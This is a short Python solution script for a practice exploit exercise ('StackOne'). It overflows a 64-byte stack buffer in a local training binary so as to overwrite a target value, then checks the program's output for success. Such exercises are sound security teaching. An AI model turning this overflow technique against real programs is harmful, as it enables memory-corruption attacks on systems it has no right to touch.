# Christopher R. Fischer
# 8/8/2021
# Exploit Excercises - StackOne Solution.

import subprocess

BFR_SIZE = 64
# Our target address.
target = [0x49, 0x6c, 0x59, 0x62]
# We can just fill the buffer with garbage
payload = 'A' * BFR_SIZE

# We add something to change our target to nonzero.
for i in range(len(target)):
    payload += chr(target[len(target) - 1 - i])

# Open the process, feed it our payload via stdin..
openedProcess = subprocess.Popen(["./stackone.c.o", str(payload)], shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
output = openedProcess.communicate()[0]
if b"successfully" in output:
    print("WIN!")
    print(output)
else:
    print("FAIL!")
    print(output)